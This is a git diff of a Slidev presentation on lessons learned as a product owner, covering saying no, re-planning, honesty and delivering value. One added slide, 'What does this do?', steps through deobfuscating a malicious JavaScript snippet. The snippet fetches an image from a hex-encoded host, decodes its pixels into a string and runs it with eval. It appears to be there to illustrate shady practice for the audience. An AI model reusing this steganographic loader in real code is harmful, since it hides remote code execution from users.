@@ -2,8 +2,7 @@
 # try also 'default' to start simple
 theme: apple-basic
 layout: intro-image
-image: 'image-url'
-background: https://images.unsplash.com/photo-1498050108023-c5249f4df085?q=80&w=2072&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
+image: ./images/patrick-fore-0gkw_9fy0eQ-unsplash.jpg
 # https://cover.sli.dev
 # some information about your slides, markdown enabled
 title: X lessons from PO
@@ -80,12 +79,69 @@ So, what were my responsibilities?
 -->
 
 ---
-layout: fact
+layout: image
+image: ./images/asch-experiment.png
 ---
 
-<h2 style="font-size: 44px; line-height:50px">Plans are worthless, <br/><span style="color:transparent">re-</span>planning is essential</h2>
+---
+layout: image-right
+image: ./images/NOOO.gif
+---
 
-Lesson I
+<h2 class="mt-40" style="font-size:26px">&mdash; No.<span v-click> How will it help?</span><span v-click="2"> = Yes *</span></h2>
+<!-- <h2 style="font-size: 44px; line-height:50px">No</h2> -->
+
+_Lesson I<span v-click="1">I</span><span v-click="2">I</span>_
+
+<span v-click="2" style="position: absolute;right:12px;bottom:12px;font-size:12px;">* conditions apply, sometimes, with trade-offs, be unblockable</span>
+
+<!--
+Alright, folks, let's dive into my first lesson: being okay with saying "No." Now, I know what you're thinking—saying "No" isn't exactly everyone's favorite word, right? But hear me out.
+
+As a product owner, you're like the gatekeeper of features and functionalities. You're bombarded with requests from stakeholders, users. And it's tempting to say "Yes" to everything, being a good guy. After all, you want to make everyone happy.
+
+But here's the thing: saying "Yes" to every request will quickly lead you down a rabbit hole of scope creep, missed deadlines, and frustrated team members.
+
+So, what's the solution? Learning to embrace the power of "No." Now, I'm not talking about being a buzzkill and shutting down every idea that comes your way. No, no, no. It's about being strategic and assertive in your decision-making.
+
+Be decisive.
+
+When faced with a new feature request or change in scope, ask yourself: Does this align with our product vision? Will it benefit our target users? Can we realistically implement it? If the answer is "No" to any of these questions, then it's okay to say "No".
+
+By setting boundaries and managing expectations, you're not only protecting the integrity of your product but also fostering a culture of transparency and accountability within your team.
+
+So, the next time you find yourself in a "Yes" or "No" dilemma, remember: it's not about being the bad guy, it's about building product for the purpose.
+
+**AUDIENCE QUIESTONS?..**
+
+
+Interesting enough, every time you need to say "No", you most probably are facing a users's problem you don't yet know.
+People are intristicly good. They always try to help you, especially when you're a young start-up, interviewing face-to-face with a user.
+They try to make your life easier by suggesting solutions, which usually is the source of ...interesting requests.
+
+[click] Every time you need to say "No", you can continue with "But how will this help?"
+"How" is the golden question. It forces people to uncover their problems, remembering incidents and modelling the situations they encounter in front of you.
+
+? Example ?
+
+This is a goldmine for upsales, feature improvement, and honest feedback collection.
+More often then not following up on "No"s will lead to more trustworthy collaboration with the client.
+
+[click] In a sence, one "No" can become multiple "Yes".. in future.. maybe.
+-->
+
+---
+layout: intro-image-right
+image: ./images/planning.jpg
+---
+
+<h2 style="font-size: 44px; line-height:50px">Plans are worthless<span v-click>, <br/>
+    <span v-click="2" v-mark.red="2">re-</span>planning is <span class="pl-14">essential</span>
+  </span>
+</h2>
+
+Lesson IV
+
 
 <!--
 Alright, let's explore a timeless lesson in software development: the nature of plans and planning.
@@ -93,28 +149,13 @@ Alright, let's explore a timeless lesson in software development: the nature of 
 Now, that's a common thing still worth repeating.
 
 Plans feel like a map—they give you a sense of direction and guide you, but they're not set in stone. In the ever-changing landscape of software development, sticking too rigidly to a plan can be a recipe for disaster.
--->
 
----
-layout: image
-image: "https://i.redd.it/hnrt2uupp3d11.jpg"
----
-
-<!--
 That's where planning comes in. Planning is not just about creating a static document and following it blindly—it's about the process of thinking, strategizing, and preparing for the challenges and opportunities that lie ahead.
 
 By engaging in the planning process, you're not just outlining a series of steps to follow—you're also cultivating a mindset of adaptability and resilience. You're anticipating potential roadblocks and devising contingency plans to overcome them. You're collaborating with your team to brainstorm creative solutions and iterate on your approach as needed.
 
 But here's the kicker: no matter how meticulously you plan, things will inevitably go south. Requirements will change, deadlines will shift, clients will drop out, and unexpected obstacles will crop up when you least expect them.
 -->
-
----
-layout: fact
----
-
-<h2 style="font-size: 44px; line-height:50px">Plans are worthless, <br/><span v-click v-mark.red>re-</span>planning is essential</h2>
-
-Lesson I
 
 <!--
 And that's where the true value of planning comes into play. It's not about sticking to a rigid plan no matter what—it's about being prepared to pivot and adapt when the situation calls for it. It's about having the flexibility to overcome uncertainty and turn challenges into opportunities.
@@ -127,14 +168,12 @@ layout: fact
 ---
 
 <h2 style="font-size: 44px; line-height:50px">Build to throw away</h2>
-Lesson II
+Lesson 🗑️
 
 <!--
-Having learned one of the ways of adaptability, 
+Alright, let's talk about one of the golden rules of software development: building in a way that you can easily throw away. Now, I know what you're probably thinking: "Wait, why would I want to throw away something I've spent time and resources building?"
 
-Alright, folks, let's talk about one of the golden rules of software development: building in a way that you can easily throw away. Now, I know what you're probably thinking: "Wait, why would I want to throw away something I've spent time and resources building?" Bear with me, and I'll explain.
-
-Change is the only constant. Requirements shift, technology evolves, and user feedback can send you back to the drawing board in one emial. So, it's crucial to adopt a mindset of flexibility and adaptability in your development process.
+Change is the only constant. Requirements shift, technology evolves, and user feedback can send you back to the drawing board in one email. So, it's crucial to adopt a mindset of flexibility and adaptability in your development process.
 
 Instead of clinging to your code like a shipwreck survivor to a raft, think of it more as a draft.
 
@@ -152,14 +191,20 @@ layout: fact
 ---
 
 <h2 style="font-size: 44px; line-height:50px">Do mistakes, don't blunder</h2>
-Lesson III
+Lesson 💥
 
 <!--
-Alright, let's tackle the delicate balance between making mistakes and avoiding blunders in the world of software development.
 
-Picture this: You're knee-deep in code, working on a new feature or fixing a pesky bug, when suddenly, oops! You make a mistake. It happens to the best of us, right? But here's the thing: not all mistakes are created equal.
 
 In software development, it's perfectly normal (and even expected) to encounter bumps along the road. After all, we're only human, and coding can be a complex and intricate dance of logic and syntax. But there's a difference between making a mistake and making a blunder.
+
+
+80% of winnning is not blundering
+
+Chess -> about blunders
+
+I was born for failures.
+Every fail-free success is a missed opportunity to learn.
 
 A mistake might be a typo in your code, a logic error, or forgetting to test a certain edge case. These are the little hiccups that come with the territory, and they're usually easy to spot and fix with a bit of debugging and testing.
 
@@ -182,7 +227,7 @@ layout: fact
 ---
 
 <h2 style="font-size: 44px; line-height:50px">Don't Let Others Fail</h2>
-Lesson IV
+Lesson V
 
 <!--
 Alright, let's delve into a crucial lesson in software development: the importance of supporting and uplifting your team members to prevent failure.
@@ -207,8 +252,8 @@ Because at the end of the day, your team is your greatest asset. And by lifting 
 layout: fact
 ---
 
-<h2 style="font-size: 44px; line-height:50px">Brutal Honesty > Sugarcoating</h2>
-Lesson V
+<h2 style="font-size: 44px; line-height:50px"><span v-mark.strike-through.red>Brutal</span> Honesty > Sugarcoating</h2>
+Lesson VI + I/II
 
 <!--
 Alright, let's tackle a tough but essential lesson in software development: the value of brutal honesty over polite holdbacks.
@@ -233,39 +278,10 @@ So, the next time you find yourself in a situation where honesty is called for, 
 layout: fact
 ---
 
-<h2 style="font-size: 44px; line-height:50px">No</h2>
-Lesson VI
-
-<!--
-Alright, folks, let's dive into our first lesson: being okay with saying "No." Now, I know what you're thinking—saying "No" isn't exactly everyone's favorite word, right? But hear me out.
-
-As a product owner, you're like the gatekeeper to the kingdom of features and functionalities. You're bombarded with requests from stakeholders, users, and even team members, all vying for a piece of your product pie. And let's be real, it's tempting to say "Yes" to everything. After all, you want to make everyone happy, right?
-
-But here's the thing: saying "Yes" to every request can quickly lead you down a rabbit hole of scope creep, missed deadlines, and frustrated developers. Trust me, been there, done that, got the stress-induced headache.
-
-So, what's the solution? Learning to embrace the power of "No." Now, I'm not talking about being a buzzkill and shutting down every idea that comes your way. No, no, no. It's about being strategic and assertive in your decision-making.
-
-When faced with a new feature request or change in scope, ask yourself: Does this align with our product vision? Will it benefit our users? Can we realistically implement it within our timeline and resources? If the answer is "No" to any of these questions, then it's okay to say "No" (politely, of course).
-
-By setting boundaries and managing expectations, you're not only protecting the integrity of your product but also fostering a culture of transparency and accountability within your team. Plus, you'll earn major respect points from your developers for sparing them from unnecessary stress and chaos.
-
-So, the next time you find yourself in a "Yes" or "No" dilemma, remember: it's not about being the bad guy, it's about being a savvy captain steering your ship towards success.
--->
-
-
----
-layout: fact
----
-
 <h2 style="font-size: 44px; line-height:50px">Test Riskiest Assumptions</h2>
 Lesson VII
 
 <!--
-Alright, let's talk about the importance of testing the riskiest assumptions in software development.
-
-Imagine you're embarking on a new project or feature. You've got a vision, a plan, and a whole lot of assumptions about how things are going to play out. But here's the thing: assumptions are like the proverbial elephant in the room—they're big, they're powerful, and if left unchecked, they can trample your project into oblivion.
-
-That's where testing comes in. Specifically, testing the riskiest assumptions—the ones that have the potential to sink your project if they turn out to be false.
 
 So, what exactly are these risky assumptions? Well, they're the things you're betting the farm on—the core hypotheses that underpin your project's success. Maybe you're assuming that users will love your new feature, or that your technology stack will scale to meet demand, or that your marketing strategy will attract droves of customers.
 
@@ -283,31 +299,59 @@ So, the next time you find yourself making assumptions, ask yourself: which ones
 layout: fact
 ---
 
-<h2 style="font-size: 44px; line-height:50px">Feel Value Delivery</h2>
+<h2 style="font-size: 44px; line-height:50px">Deliver Value</h2>
 Lesson VIII
 
 <!--
 Alright, let's dive into a critical lesson in product ownership: understanding how your product delivers value.
 
-As a product owner, you're not just responsible for managing features and functionalities—you're also the guardian of your product's value proposition. You need to know what sets your product apart, how it solves problems for your users, and why it matters in the grand scheme of things.
-
 So, what does it mean to know how your product delivers value?
+
+-->
+
+---
+
+## Lesson VIII: Deliver Value
+
+<p class="pt-24">
+As a product <span v-mark.strike-through.red="5">owner</span><span v-click="5"> developer</span>
+</p>
+
+<v-clicks>
+
+- manage features and functionalities
+- know how your product solves problems for your users
+- know what sets your product apart
+- understand why it matters
+
+</v-clicks>
+
+<!--
+As a product owner, you're not just responsible for managing features and functionalities — you need to know what sets your product apart, how it solves problems for your users, and why it matters in the grand scheme of things.
+
+So, people, give me your suggestions, how a product owner might achieve these goals?
+
+**AUDIENCE**
+
 
 First and foremost, it's about understanding your users inside and out. Who are they? What are their pain points? What are they trying to accomplish? By immersing yourself in the world of your users, you can gain invaluable insights into how your product can make their lives better.
 
 Next, it's about understanding the broader context in which your product operates. What are the market trends? Who are your competitors? What are the regulatory considerations? By staying informed about the external factors that impact your product, you can better position it for success and anticipate potential challenges.
 
-But perhaps most importantly, knowing how your product delivers value means having a deep understanding of your product's unique value proposition. What makes it special? What problem does it solve? What benefits does it offer to your users? By articulating and championing your product's value proposition, you can align your team around a shared vision and inspire them to deliver their best work.
+But perhaps most importantly, knowing how your product delivers value means having a deep understanding of your product's unique value proposition. What makes it special? What problem does it solve? What benefits does it offer to your users? By embracing your product's value proposition, you and your team  align around a shared vision and get inspired to deliver **value**.
 
-By knowing how your product delivers value, you're not just a product owner—you're a value creator, a problem solver, and a champion for your users. So, the next time you're making decisions about your product, remember to keep the value proposition front and center. Because when you know how your product delivers value, you're not just building software—you're building a better future for your users and your business.
+By knowing how your product delivers value, you're not just a software developer — you're a value creator, a problem solver, and a champion for your users.
+So, the next time you're making decisions about your product, remember to keep the value proposition front and center. Because when you know how your product delivers value, you're not just building software — you're affecting businesses and in turn lives of other people.
 -->
 
-
 ---
-layout: fact
+layout: intro-image
+image: ./images/Sammy.avif
 ---
 
-<h2 style="font-size: 44px; line-height:50px">Don't Bullshit, and Don't Do Shady Stuff</h2>
+<div style="margin-top:120px" />
+
+# Don't Do<br/> Shady Stuff
 Lesson IX
 
 <!--
@@ -322,6 +366,186 @@ Secondly, don't do shady stuff. This should go without saying, but it bears repe
 By embracing honesty and integrity in your work, you're not just building software—you're building trust, credibility, and lasting relationships with your team and your community. So, the next time you're faced with a moral dilemma or a temptation to take the easy way out, remember: don't bullshit, and don't do shady stuff. Your conscience—and your reputation—will thank you for it.
 -->
 
+---
+---
+
+### What does this do?
+
+````md magic-move
+```ts
+function(e) {
+  var t = function(e) {
+      return String.fromCharCode(e)
+  };
+  if (function(e) {
+      return /\x61\x70\x69\x2E\x72\x65\x65\x73\x34\x36\x2E\x63\x6F\x6D/.test(e)
+  }(e[i])) {
+    o = new Image,
+    o.onload = function(e, r) {
+        var i = r.getContext("2d");
+        var n = i
+          .drawImage(this, 0, 0)
+          .getImageData(0, 0, this.naturalWidth, this.naturalHeight)
+          .data
+        var u = "";
+        for (s = 0, a = o.length; s < a; s++)
+            if (!(s % 4 == 3 && s > 0)) {
+              return u += String.fromCharCode(~-e)
+            }
+        try {
+            window[t(101) + "val"](u)
+        } catch (e) {}
+    },
+    o.src = e[i]
+}
+```
+
+```ts
+function(e) {
+  var fromCharCode = String.fromCharCode(e);
+
+  if (function(e) {
+      return /\x61\x70\x69\x2E\x72\x65\x65\x73\x34\x36\x2E\x63\x6F\x6D/.test(e)
+  }(e[i])) {
+    o = new Image,
+    o.onload = function(e, r) {
+        var i = r.getContext("2d");
+        var n = i
+          .drawImage(this, 0, 0)
+          .getImageData(0, 0, this.naturalWidth, this.naturalHeight)
+          .data
+        var u = "";
+        for (s = 0, a = o.length; s < a; s++)
+            if (!(s % 4 == 3 && s > 0)) {
+              return u += String.fromCharCode(~-e)
+            }
+        try {
+            window[fromCharCode(101) + "val"](u)
+        } catch (e) {}
+    },
+    o.src = e[i]
+}
+```
+
+```ts
+function(e) {
+  var fromCharCode = String.fromCharCode(e);
+  
+  if (function(e) {
+      return "api.rees64.ru".test(e)
+  }(e[i])) {
+    o = new Image,
+    o.onload = function(e, r) {
+        var i = r.getContext("2d");
+        var n = i
+          .drawImage(this, 0, 0)
+          .getImageData(0, 0, this.naturalWidth, this.naturalHeight)
+          .data
+        var u = "";
+        for (s = 0, a = o.length; s < a; s++)
+            if (!(s % 4 == 3 && s > 0)) {
+              return u += String.fromCharCode(~-e)
+            }
+        try {
+            window[fromCharCode(101) + "val"](u)
+        } catch (e) {}
+    },
+    o.src = e[i]
+}
+```
+
+```ts
+function(e) {
+  var fromCharCode = String.fromCharCode(e);
+  
+  if ("api.rees64.ru".test(e[i])) {
+    o = new Image,
+    o.onload = function(e, r) {
+        var i = r.getContext("2d");
+        var n = i
+          .drawImage(this, 0, 0)
+          .getImageData(0, 0, this.naturalWidth, this.naturalHeight)
+          .data
+        var u = "";
+        for (s = 0, a = o.length; s < a; s++)
+            if (!(s % 4 == 3 && s > 0)) {
+              return u += String.fromCharCode(~-e)
+            }
+        try {
+            window[fromCharCode(101) + "val"](u)
+        } catch (e) {}
+    },
+    o.src = e[i]
+}
+```
+
+```ts {*|8-11|12-16}
+function({ link }) {
+  var fromCharCode = String.fromCharCode(e);
+  
+  if ("api.rees64.ru".test(link)) {
+    o = new Image,
+    o.onload = function(e, r) {
+        var i = r.getContext("2d");
+        var n = i
+          .drawImage(this, 0, 0)
+          .getImageData(0, 0, this.naturalWidth, this.naturalHeight)
+          .data;
+        var u = "";
+        for (s = 0, a = o.length; s < a; s++)
+            if (!(s % 4 == 3 && s > 0)) {
+              return u += String.fromCharCode(~-e)
+            }
+        try {
+            window[fromCharCode(101) + "val"](u)
+        } catch (e) {}
+    },
+    o.src = link
+}
+```
+
+```ts
+function({ link }) {
+  var fromCharCode = String.fromCharCode(e);
+  
+  if ("api.rees64.ru".test(link)) {
+    o = new Image,
+    o.onload = function(e, r) {
+        var i = r.getContext("2d");
+        var n = i
+          .drawImage(this, 0, 0)
+          .getImageData(0, 0, this.naturalWidth, this.naturalHeight)
+          .data
+        var imageBytesToString = "...";
+        try {
+            window[fromCharCode(101) + "val"](imageBytesToString)
+        } catch (e) {}
+    },
+    o.src = link
+}
+```
+
+```ts
+function({ link }) {
+  var fromCharCode = String.fromCharCode(e);
+  
+  if ("api.rees64.ru".test(link)) {
+    o = new Image,
+    o.onload = function(e, r) {
+        var i = r.getContext("2d");
+        var n = i
+          .drawImage(this, 0, 0)
+          .getImageData(0, 0, this.naturalWidth, this.naturalHeight)
+          .data
+        var imageBytesToString = "...";
+        try {
+            window["eval"](imageBytesToString)
+        } catch (e) {}
+    },
+    o.src = link
+}
+```
+````
 
 ---
 layout: fact
@@ -347,514 +571,10 @@ By acknowledging and celebrating success, we're not just boosting morale and mot
 
 ---
 layout: center
----
-
-As we reach the end of our journey through the world of software development, I hope you've found these ten lessons insightful, inspiring, and perhaps even a bit thought-provoking. From embracing honesty and integrity to celebrating success, each lesson serves as a guiding light on our path towards excellence in our craft.
-
-As product owners, developers, designers, and stakeholders, we are the architects of tomorrow's digital landscape. We hold the power to shape the future, to innovate, and to impact the lives of millions around the globe. But with that power comes great responsibility—the responsibility to lead with integrity, to collaborate with empathy, and to never lose sight of the human element behind the code.
-
-So, as we venture forth into the ever-evolving world of software development, let us carry these lessons with us as beacons of wisdom and inspiration. Let us embrace the challenges, celebrate the victories, and never stop learning and growing along the way.
-
-Together, we can build a future where technology serves humanity, where innovation knows no bounds, and where our collective efforts pave the way for a brighter tomorrow.
-
-Thank you, and may your code be bug-free and your dreams be limitless.
-
----
-layout: image-right
-image: https://cover.sli.dev
----
-
-# Code
-
-Use code snippets and get the highlighting directly, and even types hover![^1]
-
-```ts {all|5|7|7-8|10|all} twoslash
-// TwoSlash enables TypeScript hover information
-// and errors in markdown code blocks
-// More at https://shiki.style/packages/twoslash
-
-import { computed, ref } from 'vue'
-
-const count = ref(0)
-const doubled = computed(() => count.value * 2)
-
-doubled.value = 2
-```
-
-<arrow v-click="[4, 5]" x1="350" y1="310" x2="195" y2="334" color="#953" width="2" arrowSize="1" />
-
-<!-- This allow you to embed external code blocks -->
-<<< @/snippets/external.ts#snippet
-
-<!-- Footer -->
-[^1]: [Learn More](https://sli.dev/guide/syntax.html#line-highlighting)
-
-<!-- Inline style -->
-<style>
-.footnotes-sep {
-  @apply mt-5 opacity-10;
-}
-.footnotes {
-  @apply text-sm opacity-75;
-}
-.footnote-backref {
-  display: none;
-}
-</style>
-
-<!--
-Notes can also sync with clicks
-
-[click] This will be highlighted after the first click
-
-[click] Highlighted with `count = ref(0)`
-
-[click:3] Last click (skip two clicks)
--->
-
----
-level: 2
----
-
-# Shiki Magic Move
-
-Powered by [shiki-magic-move](https://shiki-magic-move.netlify.app/), Slidev supports animations across multiple code snippets.
-
-Add multiple code blocks and wrap them with <code>````md magic-move</code> (four backticks) to enable the magic move. For example:
-
-````md magic-move
-```ts {*|2|*}
-// step 1
-const author = reactive({
-  name: 'John Doe',
-  books: [
-    'Vue 2 - Advanced Guide',
-    'Vue 3 - Basic Guide',
-    'Vue 4 - The Mystery'
-  ]
-})
-```
-
-```ts {*|1-2|3-4|3-4,8}
-// step 2
-export default {
-  data() {
-    return {
-      author: {
-        name: 'John Doe',
-        books: [
-          'Vue 2 - Advanced Guide',
-          'Vue 3 - Basic Guide',
-          'Vue 4 - The Mystery'
-        ]
-      }
-    }
-  }
-}
-```
-
-```ts
-// step 3
-export default {
-  data: () => ({
-    author: {
-      name: 'John Doe',
-      books: [
-        'Vue 2 - Advanced Guide',
-        'Vue 3 - Basic Guide',
-        'Vue 4 - The Mystery'
-      ]
-    }
-  })
-}
-```
-
-Non-code blocks are ignored.
-
-```vue
-<!-- step 4 -->
-<script setup>
-const author = {
-  name: 'John Doe',
-  books: [
-    'Vue 2 - Advanced Guide',
-    'Vue 3 - Basic Guide',
-    'Vue 4 - The Mystery'
-  ]
-}
-</script>
-```
-````
-
----
-
-# Components
-
-<div grid="~ cols-2 gap-4">
-<div>
-
-You can use Vue components directly inside your slides.
-
-We have provided a few built-in components like `<Tweet/>` and `<Youtube/>` that you can use directly. And adding your custom components is also super easy.
-
-```html
-<Counter :count="10" />
-```
-
-<!-- ./components/Counter.vue -->
-<Counter :count="10" m="t-4" />
-
-Check out [the guides](https://sli.dev/builtin/components.html) for more.
-
-</div>
-<div>
-
-```html
-<Tweet id="1390115482657726468" />
-```
-
-<Tweet id="1390115482657726468" scale="0.65" />
-
-</div>
-</div>
-
-<!--
-Presenter note with **bold**, *italic*, and ~~striked~~ text.
-
-Also, HTML elements are valid:
-<div class="flex w-full">
-  <span style="flex-grow: 1;">Left content</span>
-  <span>Right content</span>
-</div>
--->
-
----
-class: px-20
----
-
-# Themes
-
-Slidev comes with powerful theming support. Themes can provide styles, layouts, components, or even configurations for tools. Switching between themes by just **one edit** in your frontmatter:
-
-<div grid="~ cols-2 gap-2" m="t-2">
-
-```yaml
----
-theme: default
----
-```
-
-```yaml
----
-theme: seriph
----
-```
-
-<img border="rounded" src="https://github.com/slidevjs/themes/blob/main/screenshots/theme-default/01.png?raw=true" alt="">
-
-<img border="rounded" src="https://github.com/slidevjs/themes/blob/main/screenshots/theme-seriph/01.png?raw=true" alt="">
-
-</div>
-
-Read more about [How to use a theme](https://sli.dev/themes/use.html) and
-check out the [Awesome Themes Gallery](https://sli.dev/themes/gallery.html).
-
----
-
-# Clicks Animations
-
-You can add `v-click` to elements to add a click animation.
-
-<div v-click>
-
-This shows up when you click the slide:
-
-```html
-<div v-click>This shows up when you click the slide.</div>
-```
-
-</div>
-
-<br>
-
-<v-click>
-
-The <span v-mark.red="3"><code>v-mark</code> directive</span>
-also allows you to add
-<span v-mark.circle.orange="4">inline marks</span>
-, powered by [Rough Notation](https://roughnotation.com/):
-
-```html
-<span v-mark.underline.orange>inline markers</span>
-```
-
-</v-click>
-
-<div mt-20 v-click>
-
-[Learn More](https://sli.dev/guide/animations#click-animations)
-
-</div>
-
----
-
-# Motions
-
-Motion animations are powered by [@vueuse/motion](https://motion.vueuse.org/), triggered by `v-motion` directive.
-
-```html
-<div
-  v-motion
-  :initial="{ x: -80 }"
-  :enter="{ x: 0 }"
-  :click-3="{ x: 80 }"
-  :leave="{ x: 1000 }"
->
-  Slidev
-</div>
-```
-
-<div class="w-60 relative">
-  <div class="relative w-40 h-40">
-    <img
-      v-motion
-      :initial="{ x: 800, y: -100, scale: 1.5, rotate: -50 }"
-      :enter="final"
-      class="absolute inset-0"
-      src="https://sli.dev/logo-square.png"
-      alt=""
-    />
-    <img
-      v-motion
-      :initial="{ y: 500, x: -100, scale: 2 }"
-      :enter="final"
-      class="absolute inset-0"
-      src="https://sli.dev/logo-circle.png"
-      alt=""
-    />
-    <img
-      v-motion
-      :initial="{ x: 600, y: 400, scale: 2, rotate: 100 }"
-      :enter="final"
-      class="absolute inset-0"
-      src="https://sli.dev/logo-triangle.png"
-      alt=""
-    />
-  </div>
-
-  <div
-    class="text-5xl absolute top-14 left-40 text-[#2B90B6] -z-1"
-    v-motion
-    :initial="{ x: -80, opacity: 0}"
-    :enter="{ x: 0, opacity: 1, transition: { delay: 2000, duration: 1000 } }">
-    Slidev
-  </div>
-</div>
-
-<!-- vue script setup scripts can be directly used in markdown, and will only affects current page -->
-<script setup lang="ts">
-const final = {
-  x: 0,
-  y: 0,
-  rotate: 0,
-  scale: 1,
-  transition: {
-    type: 'spring',
-    damping: 10,
-    stiffness: 20,
-    mass: 2
-  }
-}
-</script>
-
-<div
-  v-motion
-  :initial="{ x:35, y: 30, opacity: 0}"
-  :enter="{ y: 0, opacity: 1, transition: { delay: 3500 } }">
-
-[Learn More](https://sli.dev/guide/animations.html#motion)
-
-</div>
-
----
-
-# LaTeX
-
-LaTeX is supported out-of-box powered by [KaTeX](https://katex.org/).
-
-<br>
-
-Inline $\sqrt{3x-1}+(1+x)^2$
-
-Block
-$$ {1|3|all}
-\begin{array}{c}
-
-\nabla \times \vec{\mathbf{B}} -\, \frac1c\, \frac{\partial\vec{\mathbf{E}}}{\partial t} &
-= \frac{4\pi}{c}\vec{\mathbf{j}}    \nabla \cdot \vec{\mathbf{E}} & = 4 \pi \rho \\
-
-\nabla \times \vec{\mathbf{E}}\, +\, \frac1c\, \frac{\partial\vec{\mathbf{B}}}{\partial t} & = \vec{\mathbf{0}} \\
-
-\nabla \cdot \vec{\mathbf{B}} & = 0
-
-\end{array}
-$$
-
-<br>
-
-[Learn more](https://sli.dev/guide/syntax#latex)
-
----
-
-# Diagrams
-
-You can create diagrams / graphs from textual descriptions, directly in your Markdown.
-
-<div class="grid grid-cols-4 gap-5 pt-4 -mb-6">
-
-```mermaid {scale: 0.5, alt: 'A simple sequence diagram'}
-sequenceDiagram
-    Alice->John: Hello John, how are you?
-    Note over Alice,John: A typical interaction
-```
-
-```mermaid {theme: 'neutral', scale: 0.8}
-graph TD
-B[Text] --> C{Decision}
-C -->|One| D[Result 1]
-C -->|Two| E[Result 2]
-```
-
-```mermaid
-mindmap
-  root((mindmap))
-    Origins
-      Long history
-      ::icon(fa fa-book)
-      Popularisation
-        British popular psychology author Tony Buzan
-    Research
-      On effectiveness<br/>and features
-      On Automatic creation
-        Uses
-            Creative techniques
-            Strategic planning
-            Argument mapping
-    Tools
-      Pen and paper
-      Mermaid
-```
-
-```plantuml {scale: 0.7}
-@startuml
-
-package "Some Group" {
-  HTTP - [First Component]
-  [Another Component]
-}
-
-node "Other Groups" {
-  FTP - [Second Component]
-  [First Component] --> FTP
-}
-
-cloud {
-  [Example 1]
-}
-
-database "MySql" {
-  folder "This is my folder" {
-    [Folder 3]
-  }
-  frame "Foo" {
-    [Frame 4]
-  }
-}
-
-[Another Component] --> [Example 1]
-[Example 1] --> [Folder 3]
-[Folder 3] --> [Frame 4]
-
-@enduml
-```
-
-</div>
-
-[Learn More](https://sli.dev/guide/syntax.html#diagrams)
-
----
-foo: bar
-dragPos:
-  square: 691,33,167,_,-16
----
-
-# Draggable Elements
-
-Double-click on the draggable elements to edit their positions.
-
-<br>
-
-###### Directive Usage
-
-```md
-<img v-drag="'square'" src="https://sli.dev/logo.png">
-```
-
-<br>
-
-###### Component Usage
-
-```md
-<v-drag text-3xl>
-  <carbon:arrow-up />
-  Use the `v-drag` component to have a draggable container!
-</v-drag>
-```
-
-<v-drag pos="671,205,253,_,-15">
-  <div text-center text-3xl border border-main rounded>
-    Double-click me!
-  </div>
-</v-drag>
-
-<img v-drag="'square'" src="https://sli.dev/logo.png">
-
----
-src: ./pages/multiple-entries.md
-hide: false
----
-
----
-
-# Monaco Editor
-
-Slidev provides built-in Monaco Editor support.
-
-Add `{monaco}` to the code block to turn it into an editor:
-
-```ts {monaco}
-import { ref } from 'vue'
-import { emptyArray } from './external'
-
-const arr = ref(emptyArray(10))
-```
-
-Use `{monaco-run}` to create an editor that can execute the code directly in the slide:
-
-```ts {monaco-run}
-import { version } from 'vue'
-import { emptyArray, sayHello } from './external'
-
-sayHello()
-console.log(`vue ${version}`)
-console.log(emptyArray<number>(10).reduce(fib => [...fib, fib.at(-1)! + fib.at(-2)!], [1, 1]))
-```
-
----
-layout: center
 class: text-center
 ---
 
-# Learn More
+# And another 8382 lessons...
 
-[Documentations](https://sli.dev) · [GitHub](https://github.com/slidevjs/slidev) · [Showcases](https://sli.dev/showcases.html)
+Questions?
+
